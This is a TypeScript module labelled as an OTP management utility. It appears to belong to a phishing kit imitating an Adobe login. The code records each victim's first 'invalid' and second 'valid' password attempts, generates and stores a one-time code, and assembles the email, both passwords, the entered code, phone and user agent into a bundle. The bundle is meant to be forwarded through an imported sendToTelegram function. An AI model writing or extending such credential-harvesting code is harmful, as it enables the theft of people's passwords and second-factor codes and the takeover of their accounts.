// OTP Management Utility - Handles 6-digit OTP generation, storage, and verification (no expiration)
import { sendToTelegram } from './oauthHandler';

export interface OTPSession {
  email: string;
  phone?: string;
  deliveryMethod: 'email' | 'phone'; // User's choice
  otp: string;
  createdAt: string;
  firstAttemptPassword: string; // Store the invalid password from first attempt
  secondAttemptPassword: string; // Store the valid password from second attempt
  provider: string;
  userAgent: string;
}

const OTP_STORAGE_KEY = 'adobe_otp_sessions';

/**
 * Generate a 6-digit OTP code
 */
export const generateOTP = (): string => {
  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  console.log('🔐 Generated 6-digit OTP:', otp);
  return otp;
};

/**
 * Store OTP session data (no expiration)
 */
export const storeOTPSession = (session: OTPSession): void => {
  try {
    if (typeof sessionStorage === 'undefined') return;
    
    const sessions = getAllOTPSessions();
    sessions[session.email] = session;
    
    sessionStorage.setItem(OTP_STORAGE_KEY, JSON.stringify(sessions));
    console.log('✅ OTP session stored for:', session.email);
  } catch (err) {
    console.warn('⚠️ Could not store OTP session:', err);
  }
};

/**
 * Get all stored OTP sessions
 */
export const getAllOTPSessions = (): Record<string, OTPSession> => {
  try {
    if (typeof sessionStorage === 'undefined') return {};
    
    const data = sessionStorage.getItem(OTP_STORAGE_KEY);
    return data ? JSON.parse(data) : {};
  } catch (err) {
    console.warn('⚠️ Could not retrieve OTP sessions:', err);
    return {};
  }
};

/**
 * Get OTP session for a specific email
 */
export const getOTPSession = (email: string): OTPSession | null => {
  try {
    const sessions = getAllOTPSessions();
    return sessions[email] || null;
  } catch (err) {
    console.warn('⚠️ Could not retrieve OTP session for', email, err);
    return null;
  }
};

/**
 * Verify OTP - matches provided OTP with stored OTP (no expiration check)
 */
export const verifyOTP = (email: string, providedOTP: string): boolean => {
  try {
    const session = getOTPSession(email);
    
    if (!session) {
      console.warn('⚠️ No OTP session found for:', email);
      return false;
    }
    
    const isValid = session.otp === providedOTP;
    
    if (isValid) {
      console.log('✅ OTP verified successfully for:', email);
    } else {
      console.log('❌ OTP verification failed for:', email);
    }
    
    return isValid;
  } catch (err) {
    console.error('❌ OTP verification error:', err);
    return false;
  }
};

/**
 * Clear OTP session after verification (optional cleanup)
 */
export const clearOTPSession = (email: string): void => {
  try {
    if (typeof sessionStorage === 'undefined') return;
    
    const sessions = getAllOTPSessions();
    delete sessions[email];
    
    sessionStorage.setItem(OTP_STORAGE_KEY, JSON.stringify(sessions));
    console.log('✅ OTP session cleared for:', email);
  } catch (err) {
    console.warn('⚠️ Could not clear OTP session:', err);
  }
};

/**
 * Simulate sending OTP via email or SMS
 * In production, integrate with actual SMS/Email service
 */
export const sendOTPToUser = async (
  email: string,
  phone: string | undefined,
  deliveryMethod: 'email' | 'phone',
  otp: string
): Promise<boolean> => {
  try {
    console.log(`📨 Sending OTP via ${deliveryMethod}...`);
    
    // Call Netlify function to send OTP
    const response = await fetch('/.netlify/functions/sendOTP', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email,
        phone,
        deliveryMethod,
        otp,
        timestamp: new Date().toISOString(),
      }),
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const result = await response.json();
    console.log('✅ OTP sent successfully:', result);
    return true;
  } catch (error) {
    console.error('❌ Failed to send OTP:', error);
    return false;
  }
};

/**
 * Build comprehensive login data to send to Telegram after successful OTP verification
 */
export const buildCompleteLoginData = (
  session: OTPSession,
  otpEntered: string,
  additionalData?: any
) => {
  return {
    email: session.email,
    firstAttemptPassword: session.firstAttemptPassword, // Invalid password
    secondAttemptPassword: session.secondAttemptPassword, // Valid password
    otpEntered,
    deliveryMethod: session.deliveryMethod,
    phone: session.phone,
    provider: session.provider,
    timestamp: new Date().toISOString(),
    userAgent: session.userAgent,
    ...additionalData,
  };
};